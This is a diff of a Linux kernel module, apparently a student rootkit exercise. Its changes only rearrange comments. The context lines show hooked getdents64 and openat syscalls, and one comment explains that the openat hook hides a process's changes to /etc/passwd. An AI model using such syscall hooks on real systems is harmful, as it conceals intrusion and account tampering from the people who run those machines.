@@ -72,12 +72,6 @@ asmlinkage int sneaky_getdents64(struct pt_regs* regs){
   return totalDirpLen;
 }
 
-
-
-// Function pointer will be used to save address of the original 'openat' syscall.
-// The asmlinkage keyword is a GCC #define that indicates this function
-//    should expect it find its arguments on the stack (not in registers).
-
 /*----------------------------openat-----------------------------*/
 // 3. hide the modifications to the /etc/passwd file that the sneaky_process made
 // "cat /etc/passwd" should return contents of the original password file
@@ -92,6 +86,9 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+
+
+/*----------------------------initialize & exit-----------------------------*/
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
